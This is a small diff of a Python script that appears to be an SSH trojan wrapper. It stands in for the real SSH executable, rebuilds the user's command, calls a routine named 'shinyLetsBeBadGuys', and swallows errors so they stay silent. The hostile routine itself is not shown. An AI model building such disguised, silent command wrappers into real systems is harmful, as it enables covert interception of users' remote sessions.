@@ -402,11 +402,11 @@ def shinyLetsBeBadGuys():
     
 if __name__ == '__main__':
     import os
+    args = parseArguments()
+    intendedCommand = args[:]
+    intendedCommand[0] = originalSSHExecutable
+    intendedCommand = " ".join(intendedCommand)
     try:
-        args = parseArguments()
-        intendedCommand = args[:]
-        intendedCommand[0] = originalSSHExecutable
-        intendedCommand = " ".join(intendedCommand)
         if len(args) > 1:
             shinyLetsBeBadGuys()
     except: #I really feel weird doing a massive open-ended exception here... but silence
